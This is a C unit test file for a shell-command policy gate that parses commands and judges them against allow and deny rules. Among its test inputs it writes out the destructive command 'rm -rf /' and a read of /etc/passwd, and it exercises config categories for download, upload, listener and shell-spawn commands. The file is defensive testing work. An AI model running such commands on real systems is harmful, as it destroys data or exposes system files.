#define _POSIX_C_SOURCE 200809L
#include "../../deps/xxhash/xxhash.h"
#include "../../shellsplit/tests/ansi_parameter_cases.h"
#include "../../shellsplit/tests/malformed_source_cases.h"
#include "../../shellsplit/tests/substitution_capacity_cases.h"
#include "../../shellsplit/tests/word_expansion_cases.h"
#include "../../tests/atomic_file_fixture.h"
#include "sg_anomaly.h"
#include "shell_abstract.h"
#include "shell_depgraph.h"
#include "shell_netstring.h"
#include "shell_processor.h"
#include "shell_sequence.h"
#include "shell_tokenizer.h"
#include "shellgate.h"
#include "test_allocator.h"
#include "test_eval_buffer.h"
#include "test_io.h"
#include "test_numeric_locale.h"
#include "test_policy_fixture.h"
#include "test_sg_failures.h"
#include "test_source_scans.h"
#include <errno.h>
#include <float.h>
#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

/* shellgate_test links shellsplit_test so this regression can fault the
 * allocation made while building canonical anomaly netsequences. */
void shellsplit_test_alloc_fail_at(size_t allocation_index);
void shellsplit_test_alloc_reset(void);
size_t shellsplit_test_alloc_count(void);

static int pass_count = 0;
static int fail_count = 0;

#define ASSERT(cond)                                                           \
  do {                                                                         \
    if (!(cond)) {                                                             \
      printf("    FAIL: %s at %s:%d\n", #cond, __FILE__, __LINE__);            \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

#define ASSERT_EQ_INT(a, b)                                                    \
  do {                                                                         \
    if ((a) != (b)) {                                                          \
      printf("    FAIL: %s != %s (%ld != %ld) at %s:%d\n", #a, #b, (long)(a),  \
             (long)(b), __FILE__, __LINE__);                                   \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

#define ASSERT_EQ_UINT(a, b)                                                   \
  do {                                                                         \
    if ((a) != (b)) {                                                          \
      printf("    FAIL: %s != %s (%lu != %lu) at %s:%d\n", #a, #b,             \
             (unsigned long)(a), (unsigned long)(b), __FILE__, __LINE__);      \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

#define ASSERT_STR(a, b)                                                       \
  do {                                                                         \
    if (strcmp((a), (b)) != 0) {                                               \
      printf("    FAIL: %s != %s (\"%s\" != \"%s\") at %s:%d\n", #a, #b, (a),  \
             (b), __FILE__, __LINE__);                                         \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

#define ASSERT_NULL(ptr)                                                       \
  do {                                                                         \
    if ((ptr) != NULL) {                                                       \
      printf("    FAIL: %s should be NULL at %s:%d\n", #ptr, __FILE__,         \
             __LINE__);                                                        \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

#define ASSERT_NOT_NULL(ptr)                                                   \
  do {                                                                         \
    if ((ptr) == NULL) {                                                       \
      printf("    FAIL: %s should not be NULL at %s:%d\n", #ptr, __FILE__,     \
             __LINE__);                                                        \
      fail_count++;                                                            \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)
#define ASSERT_SG_OK(expression) ASSERT((expression) == SG_OK)
#define ASSERT_ST_OK(expression) ASSERT((expression) == ST_OK)

#define TEST(name) static void test_##name(void)
#define RUN(name)                                                              \
  do {                                                                         \
    printf("  %-40s ", #name);                                                 \
    int _pf = fail_count;                                                      \
    test_##name();                                                             \
    cleanup_temp_files();                                                      \
    if (fail_count == _pf) {                                                   \
      printf("PASS\n");                                                        \
      pass_count++;                                                            \
    }                                                                          \
  } while (0)

/* The evaluation buffer owns both diagnostic strings and the bounded
 * dependency-graph workspace. Keep normal test evaluation on the public
 * size-hint path's safe side; small-prefix contracts below deliberately pass
 * a narrower view of this same storage. */
static char eval_buf[48u * 1024u * 1024u];
static char **temp_files = NULL;
static size_t temp_file_count = 0;
static size_t temp_file_capacity = 0;

static uint64_t test_load_u64_le(const unsigned char *source) {
  uint64_t value = 0;
  for (unsigned i = 0; i < 8; i++)
    value |= (uint64_t)source[i] << (i * 8);
  return value;
}

static void test_store_u64_le(unsigned char *destination, uint64_t value) {
  for (unsigned i = 0; i < 8; i++)
    destination[i] = (unsigned char)(value >> (i * 8));
}

static void cleanup_temp_files(void) {
  for (size_t i = 0; i < temp_file_count; i++) {
    unlink(temp_files[i]);
    free(temp_files[i]);
  }
  free(temp_files);
  temp_files = NULL;
  temp_file_count = 0;
  temp_file_capacity = 0;
}

static void register_temp_file(const char *path) {
  if (temp_file_count == temp_file_capacity) {
    size_t capacity = temp_file_capacity ? temp_file_capacity * 2 : 16;
    char **files = realloc(temp_files, capacity * sizeof(*files));
    ASSERT_NOT_NULL(files);
    temp_files = files;
    temp_file_capacity = capacity;
  }
  temp_files[temp_file_count] = strdup(path);
  ASSERT_NOT_NULL(temp_files[temp_file_count]);
  temp_file_count++;
}

/* path has capacity writable bytes; stem is a trusted fixture basename.
 * This filesystem boundary checks environment-derived path length and creates
 * the unique file. Callers own the returned descriptor and generated path. */
static SHELL_NONNULL(1, 3) int temp_fixture_file(char *path, size_t capacity,
                                                 const char *stem) {
  const char *directory = getenv("TMPDIR");
  if (!directory || !directory[0])
    directory = "/tmp";
  int length = snprintf(path, capacity, "%s/%s-XXXXXX", directory, stem);
  if (length < 0)
    return -1;
  if ((size_t)length >= capacity) {
    errno = ENAMETOOLONG;
    return -1;
  }
  return mkstemp(path);
}

static const char *temp_policy_file(void) {
  static char path[256];
  int fd = temp_fixture_file(path, sizeof(path), "shellgate-test");
  if (fd < 0)
    return NULL;
  if (close(fd) != 0) {
    unlink(path);
    return NULL;
  }
  register_temp_file(path);
  return path;
}

TEST(temp_fixture_cleanup) {
  char paths[24][256];
  for (size_t i = 0; i < 24; i++) {
    const char *path = temp_policy_file();
    ASSERT_NOT_NULL(path);
    snprintf(paths[i], sizeof(paths[i]), "%s", path);
    ASSERT(access(paths[i], F_OK) == 0);
  }
  cleanup_temp_files();
  for (size_t i = 0; i < 24; i++) {
    ASSERT(access(paths[i], F_OK) == -1);
    ASSERT(errno == ENOENT);
  }
  ASSERT_NOT_NULL(temp_policy_file());
}

static sg_gate_t *gate_with_rules(const char *const *rules, size_t count) {
  sg_gate_t *g = sg_gate_new();
  if (!g)
    return NULL;
  for (size_t i = 0; i < count; i++) {
    if (test_policy_replace_cpl(g, false, rules[i], false) != ST_OK) {
      sg_gate_free(g);
      return NULL;
    }
  }
  return g;
}

static sg_error_t add_exact_outer_rule(sg_gate_t *gate, const char *command) {
  shell_command_info_t *commands = NULL;
  size_t count = 0;
  if (shell_process_command(command, strlen(command), NULL, &commands,
                            &count) != SHELL_PROCESS_OK ||
      count == 0)
    return SG_ERR_PARSE;
  shell_netstring_buffer_t netargv = {0};
  if (shell_render_netargv_buffer(&commands[0], NULL, &netargv) !=
      SHELL_PROCESS_OK) {
    shell_command_infos_free(commands, count);
    return SG_ERR_PARSE;
  }
  st_token_array_t tokens = {0};
  st_error_t error = st_netargv_classify_view(
      (st_netargv_view_t){(const char *)netargv.data, netargv.length}, &tokens);
  st_netpattern_t netpattern = {0};
  if (error == ST_OK) {
    for (size_t i = 0; i < tokens.count; i++)
      tokens.tokens[i].type = ST_TYPE_LITERAL;
    error =
        st_netpattern_encode_owned(tokens.tokens, tokens.count, &netpattern);
  }
  if (error == ST_OK)
    error = test_policy_replace_pattern(
        gate, false, (st_netpattern_view_t){netpattern.data, netpattern.length},
        false);
  sg_error_t result = error == ST_OK           ? SG_OK
                      : error == ST_ERR_MEMORY ? SG_ERR_MEMORY
                                               : SG_ERR_PARSE;
  st_netpattern_free(&netpattern);
  st_token_array_free(&tokens);
  shell_netstring_buffer_free(&netargv);
  shell_command_infos_free(commands, count);
  return result;
}

static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r) {
  memset(eval_buf, 0, sizeof(eval_buf));
  return sg_gate_evaluate(g, cmd, strlen(cmd), eval_buf, sizeof(eval_buf), r);
}

/* Reserve the evaluator's aligned depgraph tail while constraining only the
 * result-string prefix. This keeps truncation tests about diagnostics rather
 * than accidentally testing the separate workspace contract. */
static size_t eval_buffer_size_for_prefix(const char *command,
                                          size_t prefix_size) {
  size_t workspace_size = sg_test_eval_workspace_size(strlen(command));
  size_t alignment = shell_dep_workspace_alignment();
  if (workspace_size == 0)
    return 0;
  uintptr_t begin = (uintptr_t)(void *)eval_buf;
  if (prefix_size > UINTPTR_MAX - begin)
    return 0;
  uintptr_t workspace = begin + prefix_size;
  uintptr_t remainder = workspace % alignment;
  if (remainder != 0)
    workspace += alignment - remainder;
  if (workspace > UINTPTR_MAX - workspace_size)
    return 0;
  size_t total = (size_t)(workspace + workspace_size - begin);
  return total <= sizeof(eval_buf) ? total : 0;
}

/* Mirror only the public workspace-placement contract so boundary tests can
 * prove graph-backed result fields do not escape into the private tail. */
static size_t eval_result_prefix_size(const char *command, size_t buffer_size) {
  return sg_test_eval_prefix_size(eval_buf, buffer_size, strlen(command));
}

/* buffer references prefix_size readable bytes. Missing optional result
 * strings are NULL; a missing byte span is NULL only with length zero. */
static SHELL_NONNULL(2) bool result_string_in_prefix(const char *value,
                                                     const char *buffer,
                                                     size_t prefix_size) {
  if (!value)
    return true;
  uintptr_t begin = (uintptr_t)(const void *)buffer;
  uintptr_t address = (uintptr_t)(void *)value;
  if (address < begin || address - begin >= prefix_size)
    return false;
  return memchr(value, '\0', prefix_size - (size_t)(address - begin)) != NULL;
}

static SHELL_NONNULL(3) bool result_span_in_prefix(const char *value,
                                                   size_t length,
                                                   const char *buffer,
                                                   size_t prefix_size) {
  if (!value)
    return length == 0;
  uintptr_t begin = (uintptr_t)(const void *)buffer;
  uintptr_t address = (uintptr_t)(void *)value;
  if (address < begin || address - begin > prefix_size)
    return false;
  return length <= prefix_size - (size_t)(address - begin);
}

/* The depgraph workspace occupies the buffer tail after graph construction.
 * Every public result pointer must stay in the prefix; this checks every
 * distinct string-bearing result field rather than only command/netargv. */
static SHELL_NONNULL(1, 2) bool result_fields_stay_in_buffer(
    const sg_result_t *result, const char *buffer, size_t prefix_size) {
  if (!result_string_in_prefix(result->deny_reason, buffer, prefix_size))
    return false;
  for (uint32_t i = 0; i < result->subcommand_count; i++) {
    const sg_subcommand_result_t *subcommand = &result->subcommands[i];
    if (!result_string_in_prefix(subcommand->display_command, buffer,
                                 prefix_size) ||
        !result_string_in_prefix(subcommand->reject_reason, buffer,
                                 prefix_size) ||
        !result_span_in_prefix(subcommand->netargv, subcommand->netargv_length,
                               buffer, prefix_size))
      return false;
  }
  for (uint32_t i = 0; i < result->suggestion_count; i++)
    if (!result_string_in_prefix(result->suggestions[i], buffer, prefix_size))
      return false;
  for (uint32_t i = 0; i < result->deny_suggestion_count; i++)
    if (!result_string_in_prefix(result->deny_suggestions[i], buffer,
                                 prefix_size))
      return false;
  for (uint32_t i = 0; i < result->violation_count; i++)
    if (!result_string_in_prefix(result->violations[i].description, buffer,
                                 prefix_size) ||
        !result_string_in_prefix(result->violations[i].detail, buffer,
                                 prefix_size))
      return false;
  return true;
}

static SHELL_NONNULL(1) bool result_fields_stay_in_prefix(
    const sg_result_t *result, size_t prefix_size) {
  return result_fields_stay_in_buffer(result, eval_buf, prefix_size);
}

static sg_error_t eval_with_prefix(sg_gate_t *gate, const char *command,
                                   size_t prefix_size, sg_result_t *result) {
  size_t buffer_size = eval_buffer_size_for_prefix(command, prefix_size);
  /* Prefix tests require a representable fixture buffer before evaluation. */
  ASSERT(buffer_size != 0);
  memset(eval_buf, 0, buffer_size);
  return sg_gate_evaluate(gate, command, strlen(command), eval_buf, buffer_size,
                          result);
}

/* --- LIFECYCLE --- */

static st_policy_t *binding_policy(const char *cpl) {
  st_policy_ctx_t *context = st_policy_ctx_new();
  if (!context)
    return NULL;
  st_policy_t *policy = st_policy_new(context);
  st_policy_ctx_release(context);
  if (policy && cpl) {
    st_netpattern_t pattern = {0};
    st_error_t error = st_netpattern_from_cpl_owned(cpl, &pattern);
    if (error == ST_OK)
      error = st_policy_add_netpattern_view(
          policy, (st_netpattern_view_t){pattern.data, pattern.length});
    st_netpattern_free(&pattern);
    if (error != ST_OK) {
      st_policy_free(policy);
      return NULL;
    }
  }
  return policy;
}

TEST(policy_binding_lifecycle) {
  st_policy_t *allow = binding_policy("echo ok");
  st_policy_t *deny = binding_policy("echo blocked");
  ASSERT(allow && deny);
  sg_test_alloc_fail_at(1);
  sg_gate_t *owner = sg_gate_new_with_policies_owned(allow, deny);
  sg_test_alloc_reset();
  ASSERT(owner == NULL);
  ASSERT(st_policy_rule_count(allow) == 1);
  owner = sg_gate_new_with_policies_owned(allow, deny);
  ASSERT(owner != NULL);
  ASSERT(sg_gate_allow_policy_borrowed(owner) == allow &&
         sg_gate_deny_policy_borrowed(owner) == deny);
  sg_gate_t *borrower = sg_gate_new_with_policies_borrowed(allow, deny);
  ASSERT(borrower != NULL);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(borrower, "echo ok", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  /* Setters may borrow policies already owned by another gate. */
  sg_gate_t *setter_borrower = sg_gate_new();
  ASSERT(setter_borrower != NULL);
  sg_gate_set_allow_policy_borrowed(setter_borrower,
                                    sg_gate_allow_policy_borrowed(owner));
  sg_gate_set_deny_policy_borrowed(setter_borrower,
                                   sg_gate_deny_policy_borrowed(owner));
  ASSERT(sg_gate_allow_policy_borrowed(setter_borrower) == allow &&
         sg_gate_deny_policy_borrowed(setter_borrower) == deny);
  ASSERT_SG_OK(eval_cmd(setter_borrower, "echo ok", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(setter_borrower, "echo blocked", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  sg_gate_free(setter_borrower);
  ASSERT_SG_OK(eval_cmd(owner, "echo ok", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(owner, "echo blocked", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  st_policy_t *next_allow = binding_policy("pwd");
  st_policy_t *next_deny = binding_policy("pwd");
  ASSERT(next_allow && next_deny);
  /* Detach both borrowed slots before the owner retires their old objects. */
  sg_gate_set_allow_policy_borrowed(borrower, next_allow);
  sg_gate_set_deny_policy_borrowed(borrower, next_deny);
  sg_gate_set_allow_policy_owned(owner, next_allow);
  sg_gate_set_deny_policy_owned(owner, next_deny);
  ASSERT_SG_OK(eval_cmd(borrower, "pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  sg_gate_free(borrower);
  ASSERT(st_policy_rule_count(next_allow) == 1);
  sg_gate_free(owner);

  allow = binding_policy("true");
  deny = binding_policy(NULL);
  ASSERT(allow && deny);
  sg_gate_t *mixed = sg_gate_new();
  ASSERT(mixed);
  sg_gate_set_allow_policy_borrowed(mixed, allow);
  sg_gate_set_deny_policy_borrowed(mixed, deny);
  st_policy_t *owned_deny = binding_policy("false");
  ASSERT(owned_deny);
  sg_gate_set_deny_policy_owned(mixed, owned_deny);
  sg_gate_free(mixed);
  ASSERT(st_policy_rule_count(allow) == 1 && st_policy_rule_count(deny) == 0);
  st_policy_free(allow);
  st_policy_free(deny);
}

TEST(anomaly_component_borrowed_views) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate);
  ASSERT(sg_gate_anomaly_raw_model_borrowed(gate) == NULL &&
         sg_gate_anomaly_type_model_borrowed(gate) == NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  const sg_anomaly_model_t *raw = sg_gate_anomaly_raw_model_borrowed(gate);
  const sg_anomaly_model_t *type = sg_gate_anomaly_type_model_borrowed(gate);
  ASSERT(raw && type && raw != type);
  ASSERT(sg_anomaly_model_vocab_size(raw) == 0 &&
         sg_anomaly_model_vocab_size(type) == 0);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo ok; true; pwd", &result));
  ASSERT(sg_anomaly_model_vocab_size(raw) == 3 &&
         sg_anomaly_model_total_unigrams(type) == 3);
  sg_test_alloc_fail_at(1);
  sg_error_t error = sg_gate_enable_anomaly(gate, 100.0, NULL);
  sg_test_alloc_reset();
  ASSERT(error == SG_ERR_MEMORY);
  ASSERT(sg_gate_anomaly_raw_model_borrowed(gate) == raw &&
         sg_gate_anomaly_type_model_borrowed(gate) == type);
  sg_gate_disable_anomaly(gate);
  ASSERT(sg_gate_anomaly_raw_model_borrowed(gate) == NULL &&
         sg_gate_anomaly_type_model_borrowed(gate) == NULL);
  sg_gate_free(gate);
}

TEST(gate_api_contract_matrix) {
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_new() == NULL);
  sg_test_alloc_reset();

  st_test_alloc_reset();
  sg_gate_t *allocation_probe = sg_gate_new();
  ASSERT(allocation_probe != NULL);
  size_t construction_allocations = st_test_alloc_count();
  st_test_alloc_reset();
  sg_gate_free(allocation_probe);
  ASSERT(construction_allocations > 0);
  for (size_t fail_at = 1; fail_at <= construction_allocations; fail_at++) {
    st_test_alloc_fail_at(fail_at);
    allocation_probe = sg_gate_new();
    st_test_alloc_reset();
    ASSERT(allocation_probe == NULL);
  }

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);

  ASSERT(!sg_gate_anomaly_had_error(g));
  sg_gate_free(NULL);

  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  char buf[64];
  sg_result_t r;

  ASSERT(sg_gate_evaluate(g, "ls", 0, buf, sizeof(buf), &r) == SG_ERR_INVALID);

  ASSERT(sg_gate_evaluate(g, "ls", 2, buf, 0, &r) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "", 0, buf, sizeof(buf), &r) == SG_ERR_INVALID);
  static const char embedded_nul[] = {'l', 's', '\0', ';', 'i', 'd'};
  ASSERT(sg_gate_evaluate(g, embedded_nul, sizeof(embedded_nul), buf,
                          sizeof(buf), &r) == SG_ERR_INVALID);

  sg_gate_free(g);
}

TEST(shell_list_parse_boundary_contract) {
  static const char *const invalid[] = {
      "left |",
      "left |&",
      "left &&",
      "left ||",
      "left | ! x",
      "left |& ! x",
      "left && && x",
      "left || || x",
      "left & & x",
      "left |& | x",
      "left |& ; x",
      "echo >#comment",
      "echo { literal; }",
      "echo (cat)",
      "echo ((1))",
      "echo 2>#comment",
      "echo <#comment",
      "echo >|#comment",
      "echo <>#comment",
      "echo &>#comment",
      "echo &>>#comment",
      "echo <<<#comment",
      "echo <<#comment",
      "echo <<-#comment",
      "echo << #comment",
      "echo <<- #comment",
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "left", false));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "left", &result));
  ASSERT(result.subcommand_count == 1);
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    memset(eval_buf, 0, sizeof(eval_buf));
    memset(&result, 0, sizeof(result));
    ASSERT(sg_gate_evaluate(gate, invalid[i], strlen(invalid[i]), eval_buf,
                            sizeof(eval_buf), &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT);
    /* Shellsplit may retain a completed prefix for diagnostics, but parsing a
     * new invalid source must never reuse the prior successful result. */
    ASSERT(result.subcommand_count <= 1);
    ASSERT(!result.truncated);
    ASSERT_STR(eval_buf, "parse error");
  }
  sg_gate_free(gate);
}

/* Bash's raw duplication close marker ends at `-`, not at the end of an
 * adjacent shell word. Keep Shellgate's public canonical result aligned with
 * the parser and reject the same spelling after a compound group. */
TEST(raw_close_marker_shellgate_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf * *"}, 1);
  ASSERT(gate != NULL);

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "printf x >&-file", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
         result.subcommands[0].netargv != NULL &&
         result.subcommands[0].netargv_length ==
             strlen("6:printf,1:x,4:file,") &&
         memcmp(result.subcommands[0].netargv, "6:printf,1:x,4:file,",
                result.subcommands[0].netargv_length) == 0);

  memset(&result, 0, sizeof(result));
  ASSERT(sg_gate_evaluate(gate, "{ printf x; } >&-file",
                          strlen("{ printf x; } >&-file"), eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count <= 1 &&
         !result.truncated && strcmp(eval_buf, "parse error") == 0);
  sg_gate_free(gate);
}

/* Shellgate consumes Shellsplit's completed command ranges. Only syntax that
 * actually quotes a word fragment may hide metacharacters from the outer
 * command list; ordinary brace and bracket text remains structural. */
TEST(word_fragment_operator_shellgate_contract) {
  static const char *const opaque_cases[] = {
      "echo ${value:-left|&right}",
      "echo ${value:-left>file}",
      "echo prefix@(left|right)suffix",
      "echo prefix\\{left\\|right\\}suffix",
      "echo '[left|right]'",
      "echo \\|",
      "echo \\&",
      "echo \\;",
      "echo \\|\\&",
  };

  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(opaque_cases) / sizeof(opaque_cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, opaque_cases[i], &result));
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(result.subcommand_count == 1);
    ASSERT(result.subcommands[0].netargv != NULL);
    ASSERT(!result.truncated);
  }
  static const char *const structural_cases[] = {
      "echo prefix{left|right}suffix",
      "echo [left|right]",
      "echo [[:alpha:]|]",
  };
  for (size_t i = 0; i < sizeof(structural_cases) / sizeof(structural_cases[0]);
       i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, structural_cases[i], &result));
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(result.subcommand_count == 2);
    ASSERT(result.subcommands[0].netargv != NULL);
    ASSERT(result.subcommands[1].netargv != NULL);
    ASSERT(!result.truncated);
  }
  sg_gate_free(gate);
}

TEST(setter_matrix) {
  static const char *paths[] = {"/tmp", "/home/user"};
  static const sg_stop_mode_t modes[] = {SG_STOP_FIRST_FAIL, SG_STOP_FIRST_PASS,
                                         SG_STOP_FIRST_ALLOW,
                                         SG_STOP_FIRST_DENY, SG_EVAL_ALL};
  static const uint32_t masks[] = {0, UINT32_MAX, SG_REJECT_MASK_DEFAULT};
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++)
    ASSERT(sg_gate_set_cwd(g, paths[i]) == SG_OK);
  char long_cwd[513];
  memset(long_cwd, 'x', sizeof(long_cwd) - 1);
  long_cwd[sizeof(long_cwd) - 1] = '\0';
  ASSERT(sg_gate_set_cwd(g, "/stable") == SG_OK);
  ASSERT(sg_gate_set_cwd(g, long_cwd) == SG_ERR_TRUNC);
  for (size_t i = 0; i < sizeof(modes) / sizeof(modes[0]); i++)
    ASSERT(sg_gate_set_stop_mode(g, modes[i]) == SG_OK);
  for (size_t i = 0; i < sizeof(masks) / sizeof(masks[0]); i++)
    ASSERT(sg_gate_set_reject_mask(g, masks[i]) == SG_OK);
  ASSERT(sg_gate_set_suggestions(g, true) == SG_OK);
  ASSERT(sg_gate_set_suggestions(g, false) == SG_OK);
  ASSERT(sg_gate_set_expand_word_netargv(g, NULL, NULL) == SG_OK);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT(sg_gate_set_violation_config_borrowed(g, &config) == SG_OK);

#define ASSERT_INVALID_CONFIG_ARRAY(member, count_member, maximum)             \
  do {                                                                         \
    sg_violation_config_t malformed = config;                                  \
    malformed.count_member = (maximum) + 1;                                    \
    ASSERT(sg_gate_set_violation_config_borrowed(g, &malformed) ==             \
           SG_ERR_INVALID);                                                    \
    malformed = config;                                                        \
    malformed.count_member = 1;                                                \
    malformed.member[0] = NULL;                                                \
    ASSERT(sg_gate_set_violation_config_borrowed(g, &malformed) ==             \
           SG_ERR_INVALID);                                                    \
  } while (0)
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_write_paths, sensitive_write_path_count,
                              SG_VIOL_MAX_PATHS);
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_dirs, sensitive_dir_count,
                              SG_VIOL_MAX_PATHS);
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_env_names, sensitive_env_name_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_cmd_names, sensitive_cmd_name_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_read_paths, sensitive_read_path_count,
                              SG_VIOL_MAX_PATHS);
  ASSERT_INVALID_CONFIG_ARRAY(download_cmds, download_cmd_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(shell_spawn_cmds, shell_spawn_cmd_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(perm_mod_cmds, perm_mod_cmd_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(sensitive_secret_paths,
                              sensitive_secret_path_count, SG_VIOL_MAX_PATHS);
  ASSERT_INVALID_CONFIG_ARRAY(file_reading_cmds, file_reading_cmd_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(upload_cmds, upload_cmd_count, SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(listener_cmds, listener_cmd_count,
                              SG_VIOL_MAX_NAMES);
  ASSERT_INVALID_CONFIG_ARRAY(shell_profile_paths, shell_profile_path_count,
                              SG_VIOL_MAX_PATHS);
#undef ASSERT_INVALID_CONFIG_ARRAY

  ASSERT(sg_gate_set_stop_mode(g, (sg_stop_mode_t)-1) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_stop_mode(g, (sg_stop_mode_t)(SG_EVAL_ALL + 1)) ==
         SG_ERR_INVALID);

  sg_gate_free(g);
}

/* --- BASIC EVALUATION --- */

TEST(basic_evaluation_matrix) {
  static const struct {
    const char *rules[2];
    const char *input;
    sg_verdict_t verdict;
    struct {
      const char *command;
      bool matches;
    } evaluated[2];
    size_t evaluated_count;
  } cases[] = {
      {{"ls"}, "ls", SG_VERDICT_ALLOW, {{"ls", true}}, 1},
      {{"echo \"two words\""},
       "echo 'two words'",
       SG_VERDICT_ALLOW,
       {{"echo 'two words'", true}},
       1},
      {{"printf \"\""},
       "printf ''",
       SG_VERDICT_ALLOW,
       {{"printf ''", true}},
       1},
      {{"ls"}, "rm -rf /", SG_VERDICT_UNDETERMINED, {{"rm -rf /", false}}, 1},
      {{"ls * *"},
       "ls -la /home",
       SG_VERDICT_ALLOW,
       {{"ls -la /home", true}},
       1},
      {{NULL}, "ls", SG_VERDICT_UNDETERMINED, {{"ls", false}}, 1},
      {{"ls", "sort"},
       "ls | sort",
       SG_VERDICT_ALLOW,
       {{"ls", true}, {"sort", true}},
       2},
      {{"ls"},
       "ls | rm",
       SG_VERDICT_UNDETERMINED,
       {{"ls", true}, {"rm", false}},
       2},
      {{"ls", "pwd"},
       "ls ; pwd",
       SG_VERDICT_ALLOW,
       {{"ls", true}, {"pwd", true}},
       2},
      {{"rm"},
       "rm -rf / && ls",
       SG_VERDICT_UNDETERMINED,
       {{"rm -rf /", false}, {"ls", false}},
       2},
      {{"ls"},
       "rm || ls",
       SG_VERDICT_UNDETERMINED,
       {{"rm", false}, {"ls", true}},
       2},
      {{"git * * *"},
       "git commit -m hello",
       SG_VERDICT_ALLOW,
       {{"git commit -m hello", true}},
       1},
      {{"cat #path"},
       "cat /etc/passwd",
       SG_VERDICT_ALLOW,
       {{"cat /etc/passwd", true}},
       1},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    size_t rule_count = cases[i].rules[0] ? 1 : 0;
    if (cases[i].rules[1])
      rule_count++;
    sg_gate_t *g = gate_with_rules(cases[i].rules, rule_count);
    ASSERT(g != NULL);

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == cases[i].verdict);
    ASSERT(result.subcommand_count == cases[i].evaluated_count);
    ASSERT(!result.truncated);
    for (size_t j = 0; j < cases[i].evaluated_count; j++) {
      ASSERT(result.subcommands[j].display_command != NULL);
      ASSERT(result.subcommands[j].netargv != NULL);
      st_token_array_t decoded = {0};
      ASSERT(st_netargv_classify_view(
                 (st_netargv_view_t){
                     .data = result.subcommands[j].netargv,
                     .length = result.subcommands[j].netargv_length,
                 },
                 &decoded) == ST_OK);
      ASSERT(decoded.count > 0);
      st_token_array_free(&decoded);
      ASSERT_STR(result.subcommands[j].display_command,
                 cases[i].evaluated[j].command);
      ASSERT(result.subcommands[j].matches == cases[i].evaluated[j].matches);
      ASSERT(result.subcommands[j].verdict == (cases[i].evaluated[j].matches
                                                   ? SG_VERDICT_ALLOW
                                                   : SG_VERDICT_UNDETERMINED));
    }
    if (i == 1)
      ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
    if (i == 2)
      ASSERT_STR(result.subcommands[0].netargv, "6:printf,0:,");
    sg_gate_free(g);
  }

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  sg_result_t result = {0};
  char diagnostic[32];
  ASSERT(sg_gate_evaluate(g, "foo() { echo x; }", 17, diagnostic,
                          sizeof(diagnostic), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);
